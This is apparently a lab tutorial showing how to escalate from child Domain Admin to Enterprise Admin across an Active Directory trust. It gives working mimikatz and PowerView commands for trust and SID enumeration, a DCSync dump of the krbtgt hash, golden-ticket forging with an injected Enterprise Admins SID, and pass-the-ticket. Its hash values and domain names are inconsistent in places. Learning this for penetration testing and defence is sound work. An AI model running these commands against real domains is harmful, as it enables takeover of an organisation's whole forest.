# Abusing via mimikatz
# Abusing Parent Child Domain Trusts for Privilege Escalation from DA to EA

### SID History

When someone is using a computer network, like in a company or organization, they have an account that gives them access to certain things, like files and programs. This account is identified by a unique number called a Security Identifier (SID). Now, imagine a situation where a person has been using their account in one network, but they need to move to a different network. When they move, a new account is created for them in the new network. This new account has a different SID because it’s in a different network. However, to make sure this person can still access the things they could before in the old network, there’s a feature called SID history. It’s like a record that keeps track of the old SID associated with the person’s original account. This way, even though they have a new account in the new network, they can still get to the things they need in the old network

Now with the help of mimikatz we can manipulate the SID history. For example, if they add their account’s SID to an administrator’s SID history, they can gain administrative powers even though they’re not supposed to.

### **Concepts**

⇒ So we will be learning about how to abuse **`Child ↔ Parent domain`** trusts relationship for privilege escalation from **`Domain Admin`** ( in child domain ) to **`Enterprise Admin`** in the forest.

⇒ So if we compromise a **`child domain`** and get the **`krbtgt hash of a child domain`** and the **`Enterpise Admin SID`** that is **`[ParentDomainSID]-519`** . We can then craft a [golden ticket](https://cryptex.blog/posts/goldent/) using the info with mimikatz and get Enterprise Admin on the parent domain

Refer To the [Lab Setup](https://cryptex.blog/posts/childlab/)

> If you compromise the domain controller of a child domain in a forest, you can compromise its entire parent domain.
> 

---

### **Performing Attack**

To perform this attack after compromising a child domain, we need the following:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.

⇒ Tools Required :

- [Mimikatz](https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe)
- [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)
- We have already compromised **`DC02`** Which is **`[kid.crt.local]`**

![https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/1.png](https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/1.png)

![https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/2.png](https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/2.png)

- First we have to check the **`Trust Relationship`** between the parent and child Domain, As you can see The Trust is **`Bidirectional`** , When we see that the trust relationship is **`BiDirectional`** which basically means that members can authenticate from one domain to another when they want to access shared resources.

**`Using PowerView.ps1`**

`1
2

### PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
Get-ADTrust -Filer *`

![https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/3.png](https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/3.png)

Using Powershell Built-in cmdlet

`1

([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()`

![https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/4.png](https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/4.png)

- **The SID for the child domain**

`1
2

### PowerView tool used to get the SID for a target child domain from a Windows-based host.
Get-DomainSID`

![https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/5.png](https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/5.png)

Also we can use **Mimikatz**

`1

lsadump::trust`

![https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/6.png](https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/6.png)

In order for an attacker to grant themselves Enterprise Admin rights, they can simply add “-519” at the end of the Parent Domain’s Security Identifier (SID). This allows them to trick the system into recognizing their account as a member of the Enterprise Admins group, even though they are not actually part of it.

`kid.crt.local: S-1-5-21-1675317467-1077841801-2270613548 
enterprise admin: S-1-5-21-1011749309-1128044670-722997229-519 ; 

### ALso we can  use PowerView tool used to obtain the Enterprise Admins group's SID from a Windows-based host
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" \| select distinguishedname,objectsid`

---

**The KRBTGT hash for the child domain: using DCSync Attack**

`mimikatz # lsadump::dcsync /all /csv

### Uses Mimikatz to obtain the KRBTGT account's NT Hash from a Windows-based host.
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`

![https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/7.png](https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/7.png)

At this point, we have gathered the following data points:

- The KRBTGT hash for the child domain: `9f94j4b482771505657411065964d5f`
- The SID for the child domain: `S-1-5-21-1675317467-1077841801-2270613548`
- The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We’ll choose a fake user: hacker
- The FQDN of the child domain: `KID.CRT.LOCAL`
- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-1011749309-1128044670-722997229-519`

---

### **Execution**

**Creating a Golden Ticket with Mimikatz**

`mimikatz: kerberos::golden /user:Administrator /domain:kid.crt.local /sid:S-1-5-21-1675317467-1077841801-2270613548 /krbtgt:f368f5e16475a8248f50614e9ca0a981 /sids:S-1-5-21-1011749309-1128044670-722997229-519`

![https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/8.png](https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/8.png)

- Load the ticket to get the shell on root domain DC01

`1

mimikatz: kerberos::ptt ticket.kirbi`

![https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/9.png](https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/9.png)

- Using **`Enter-PSSession`** to connect to it remotely

![https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/10.png](https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/10.png)

---

### **Hacked**

![https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/11.png](https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/11.png)

![https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/12.png](https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/12.png)

![https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/13.png](https://raw.githubusercontent.com/unknown00759/crtimage/main/eatoda/13.png)
